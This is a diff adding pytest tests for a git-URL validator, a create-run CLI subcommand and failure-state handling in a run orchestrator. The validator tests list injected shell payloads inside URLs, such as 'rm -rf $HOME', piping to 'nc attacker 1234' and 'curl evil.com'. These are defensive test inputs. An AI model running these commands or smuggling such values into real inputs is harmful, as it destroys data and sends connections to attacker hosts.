@@ -10,11 +10,13 @@ import scripts.run as run_mod
 from scripts.migrate import MIGRATIONS_DIR, apply_migrations
 from scripts.project import create_project
 from scripts.run import (
+    _cmd_create_run_only,
     create_run,
     finalize_run,
     get_run,
     list_runs,
     orchestrate_run,
+    update_run_branch,
 )
 
 
@@ -124,6 +126,78 @@ def test_parse_owner_repo_ssh():
 def test_parse_owner_repo_raises_on_garbage():
     with pytest.raises(ValueError):
         run_mod.parse_owner_repo("not a url")
+
+
+# ── validate_git_url — B-INJ-1 shell-metacharacter denylist ──────────────
+
+
+def test_validate_git_url_accepts_well_formed_https():
+    run_mod.validate_git_url("https://github.com/owner/repo.git")
+    run_mod.validate_git_url("https://github.com/owner/repo")
+    run_mod.validate_git_url("https://gitlab.example.com/group/project.git")
+
+
+def test_validate_git_url_accepts_well_formed_ssh():
+    run_mod.validate_git_url("git@github.com:owner/repo.git")
+    run_mod.validate_git_url("user@host.example.com:org/proj")
+
+
+@pytest.mark.parametrize(
+    "malicious",
+    [
+        # B-INJ-1 attack catalogue.
+        "https://x; rm -rf $HOME #",
+        "https://x.com/o/r.git; touch /tmp/pwned",
+        "https://x.com/o/r.git && curl evil.com",
+        "https://x.com/o/r.git | nc attacker 1234",
+        "https://x.com/$(rm -rf .)/r.git",
+        "https://x.com/`rm -rf .`/r.git",
+        "https://x.com/o/r.git\ntouch /tmp/pwned",
+        "https://x.com/o/r.git\rcarriage",
+        'https://x.com/o/r"or"1=1',
+        "https://x.com/o/r'or'1=1",
+        "https://x.com/o/r\\backslash",
+        "https://x.com/o /r",  # embedded space
+        "https://x.com/o/r<redirect.txt",
+        "https://x.com/o/r>redirect.txt",
+        # Control char (NUL).
+        "https://x.com/o/r\x00",
+    ],
+)
+def test_validate_git_url_rejects_shell_metacharacters(malicious):
+    with pytest.raises(ValueError):
+        run_mod.validate_git_url(malicious)
+
+
+def test_validate_git_url_rejects_empty_and_none():
+    with pytest.raises(ValueError):
+        run_mod.validate_git_url("")
+    with pytest.raises(ValueError):
+        run_mod.validate_git_url(None)  # type: ignore[arg-type]
+
+
+def test_create_run_only_refuses_malicious_url(db, capsys):
+    """B-INJ-1 end-to-end: a malicious URL fed into _cmd_create_run_only
+    must exit non-zero with an actionable error, BEFORE touching the
+    projects table."""
+    code = _cmd_create_run_only(["https://x; rm -rf $HOME #", "1"], db_path=db)
+    assert code == 1
+    err = capsys.readouterr().err
+    assert "invalid git_url" in err
+
+
+def test_create_run_only_refuses_command_substitution_in_url(db, capsys):
+    code = _cmd_create_run_only(["https://x.com/$(touch /tmp/pwned)/r.git", "1"], db_path=db)
+    assert code == 1
+    err = capsys.readouterr().err
+    assert "invalid git_url" in err
+
+
+def test_create_run_only_refuses_pipe_in_url(db, capsys):
+    code = _cmd_create_run_only(["https://x.com/o/r.git | nc evil 9999", "1"], db_path=db)
+    assert code == 1
+    err = capsys.readouterr().err
+    assert "invalid git_url" in err
 
 
 # ── Orchestrator tests ─────────────────────────────────────────────────────
@@ -1113,3 +1187,271 @@ def test_orchestrate_run_accepts_all_schema_allowed_phase_values(
     assert db_row is not None
     assert db_row[0] == phase
     assert db_row[1] == reason_for_phase[phase]
+
+
+# ── update_run_branch helper ──────────────────────────────────────────────
+
+
+def test_update_run_branch_writes_real_branch_name(db, project):
+    row = create_run(db, project["id"], "<pending>", 1, "x")
+    update_run_branch(db, row["id"], "kaizen/foo-2026-05-23-2342")
+    refreshed = get_run(db, row["id"])
+    assert refreshed["branch"] == "kaizen/foo-2026-05-23-2342"
+
+
+def test_update_run_branch_writes_failed_sentinel_for_none(db, project):
+    """The MAJOR-NEW-BRANCH-NOT-NULL fix: passing branch=None must
+    persist the '<failed>' sentinel, NOT a literal SQL NULL (the schema
+    column is `TEXT NOT NULL` per migrations/001 line 18)."""
+    row = create_run(db, project["id"], "<pending>", 1, "x")
+    update_run_branch(db, row["id"], None)
+    refreshed = get_run(db, row["id"])
+    assert refreshed["branch"] == "<failed>"
+    # Confirm at the DB level too — never NULL.
+    from scripts.db import get_connection
+
+    conn = get_connection(db)
+    try:
+        cur = conn.execute("SELECT branch FROM runs WHERE id=?", (row["id"],))
+        raw = cur.fetchone()[0]
+    finally:
+        conn.close()
+    assert raw == "<failed>"
+    assert raw is not None
+
+
+def test_update_run_branch_raises_on_unknown_run_id(db):
+    with pytest.raises(ValueError, match="not found"):
+        update_run_branch(db, 999_999, "kaizen/x")
+
+
+# ── create-run-only CLI subcommand ────────────────────────────────────────
+
+
+def test_create_run_only_fails_loudly_when_project_not_registered(db, capsys):
+    """Decision D3: no project for URL → exit 1 with a registration
+    hint. Auto-registration was rejected because it would mask URL
+    typos."""
+    code = _cmd_create_run_only(["https://github.com/nope/never.git", "1"], db_path=db)
+    assert code == 1
+    err = capsys.readouterr().err
+    assert "No project registered" in err
+    assert "project.py register" in err
+
+
+def test_create_run_only_prints_only_run_id(db, project, capsys):
+    code = _cmd_create_run_only([project["git_url"], "2", "my subject"], db_path=db)
+    assert code == 0
+    captured = capsys.readouterr()
+    # stdout MUST contain ONLY the run id (and a trailing newline).
+    stdout = captured.out.strip()
+    assert stdout.isdigit(), f"expected only the run_id on stdout; got {stdout!r}"
+    run_id = int(stdout)
+    row = get_run(db, run_id)
+    assert row["status"] == "running"
+    assert row["branch"] == "<pending>"
+    assert row["cycles_requested"] == 2
+    assert row["subject"] == "my subject"
+
+
+def test_create_run_only_seeds_pending_branch_placeholder(db, project):
+    code = _cmd_create_run_only([project["git_url"], "1"], db_path=db)
+    assert code == 0
+    rows = list_runs(db, project_id=project["id"])
+    assert rows[-1]["branch"] == "<pending>"
+
+
+# ── orchestrate_run with run_id kwarg ─────────────────────────────────────
+
+
+def test_orchestrate_run_with_run_id_skips_create_run(db, project, tmp_path, monkeypatch):
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+    # Seed a pending row via create-run-only.
+    rid_from_cli = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
+    assert rid_from_cli == 0
+    # The run row exists; grab it.
+    rows = list_runs(db, project_id=project["id"])
+    assert len(rows) == 1
+    pending_run = rows[0]
+    assert pending_run["branch"] == "<pending>"
+
+    def fake_executor(clone_dir, proj, run_row, cycle_n):
+        return {
+            "status": "success",
+            "commit_sha": "shaX",
+            "minutes_memex_slug": None,
+        }
+
+    result = orchestrate_run(
+        db_path=db,
+        git_url=project["git_url"],
+        cycles_requested=1,
+        subject="subj",
+        cycle_executor=fake_executor,
+        run_id=pending_run["id"],
+    )
+    # Same run_id round-tripped — no second row created.
+    assert result["run_id"] == pending_run["id"]
+    assert len(list_runs(db, project_id=project["id"])) == 1
+    # Branch was updated from <pending> to the real name.
+    final = get_run(db, pending_run["id"])
+    assert final["branch"] != "<pending>"
+    assert final["branch"].startswith("kaizen/")
+
+
+def test_orchestrate_run_with_unknown_run_id_raises(db, project, tmp_path, monkeypatch):
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+    with pytest.raises(ValueError, match="run_id="):
+        orchestrate_run(
+            db_path=db,
+            git_url=project["git_url"],
+            cycles_requested=1,
+            cycle_executor=lambda *a: {
+                "status": "success",
+                "commit_sha": "x",
+                "minutes_memex_slug": None,
+            },
+            run_id=999_999,
+        )
+
+
+def test_orchestrate_run_unknown_run_id_raises_before_clone(db, project, tmp_path, monkeypatch):
+    """M1 (review round 1): unknown `run_id` must raise BEFORE any
+    clone/seed/branch side effect. Previously the check fired AFTER
+    clone_repo + seed_all + create_branch, leaving disk debris."""
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+
+    clone_calls: list = []
+    seed_calls: list = []
+    branch_calls: list = []
+
+    import scripts.clone as clone_mod
+    import scripts.cycle_git as cg_mod
+    import scripts.seed_atelier_in_clone as seed_mod
+
+    monkeypatch.setattr(clone_mod, "clone_repo", lambda *a, **k: clone_calls.append(a))
+    monkeypatch.setattr(seed_mod, "seed_all", lambda *a, **k: seed_calls.append(a))
+    monkeypatch.setattr(cg_mod, "create_branch", lambda *a, **k: branch_calls.append(a))
+
+    experiment_dir = tmp_path / "experiment" / "owner-repo"
+
+    with pytest.raises(ValueError, match="run_id="):
+        orchestrate_run(
+            db_path=db,
+            git_url=project["git_url"],
+            cycles_requested=1,
+            cycle_executor=lambda *a: {
+                "status": "success",
+                "commit_sha": "x",
+                "minutes_memex_slug": None,
+            },
+            run_id=999_999,
+        )
+
+    assert clone_calls == [], f"clone_repo must not run; got {clone_calls}"
+    assert seed_calls == [], f"seed_all must not run; got {seed_calls}"
+    assert branch_calls == [], f"create_branch must not run; got {branch_calls}"
+    assert not experiment_dir.exists()
+
+
+def test_orchestrate_run_clone_failure_blanks_branch_when_run_id_supplied(
+    db, project, tmp_path, monkeypatch
+):
+    """M2 (review round 1): clone_repo failure with run_id supplied must
+    transition runs.branch from '<pending>' to '<failed>' AND
+    finalize_run as 'failed'. Previously the run row stuck at
+    branch='<pending>' / status='running' forever."""
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+    import scripts.clone as clone_mod
+
+    def boom_clone(*a, **k):
+        raise RuntimeError("clone boom")
+
+    monkeypatch.setattr(clone_mod, "clone_repo", boom_clone)
+
+    rc = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
+    assert rc == 0
+    pending_run = list_runs(db, project_id=project["id"])[-1]
+    assert pending_run["branch"] == "<pending>"
+
+    with pytest.raises(RuntimeError, match="clone boom"):
+        orchestrate_run(
+            db_path=db,
+            git_url=project["git_url"],
+            cycles_requested=1,
+            cycle_executor=lambda *a: {
+                "status": "success",
+                "commit_sha": "x",
+                "minutes_memex_slug": None,
+            },
+            run_id=pending_run["id"],
+        )
+
+    final = get_run(db, pending_run["id"])
+    assert final["branch"] == "<failed>", (
+        f"clone failure must blank branch; got {final['branch']!r}"
+    )
+    assert final["status"] == "failed"
+
+
+def test_orchestrate_run_push_failure_blanks_branch_when_run_id_supplied(
+    db, project, tmp_path, monkeypatch
+):
+    """M3 (review round 1): push_branch failure must also blank the
+    branch column when run_id was supplied, so a later manual pr.py
+    invocation refuses to render."""
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+
+    import scripts.cycle_git as cg_mod
+
+    def boom_push(*a, **k):
+        raise RuntimeError("push refused")
+
+    monkeypatch.setattr(cg_mod, "push_branch", boom_push)
+
+    rc = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
+    assert rc == 0
+    pending_run = list_runs(db, project_id=project["id"])[-1]
+
+    result = orchestrate_run(
+        db_path=db,
+        git_url=project["git_url"],
+        cycles_requested=1,
+        cycle_executor=lambda *a: {
+            "status": "success",
+            "commit_sha": "x",
+            "minutes_memex_slug": None,
+        },
+        run_id=pending_run["id"],
+    )
+    assert result["status"] == "failed"
+    final = get_run(db, pending_run["id"])
+    assert final["branch"] == "<failed>"
+    assert final["status"] == "failed"
+
+
+def test_orchestrate_run_with_run_id_writes_failed_sentinel_on_cycle_exception(
+    db, project, tmp_path, monkeypatch
+):
+    """The bridge entry path's failure case: when the cycle loop raises,
+    runs.branch must transition from '<pending>' (or the real name) to
+    '<failed>' so render_pr_body refuses any later PR attempt."""
+    _install_orchestrator_stubs(monkeypatch, tmp_path)
+    _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
+    pending_run = list_runs(db, project_id=project["id"])[-1]
+
+    def boom(clone_dir, proj, run_row, cycle_n):
+        raise RuntimeError("cycle boom")
+
+    with pytest.raises(RuntimeError, match="cycle boom"):
+        orchestrate_run(
+            db_path=db,
+            git_url=project["git_url"],
+            cycles_requested=1,
+            cycle_executor=boom,
+            run_id=pending_run["id"],
+        )
+
+    final = get_run(db, pending_run["id"])
+    assert final["status"] == "failed"
+    assert final["branch"] == "<failed>"
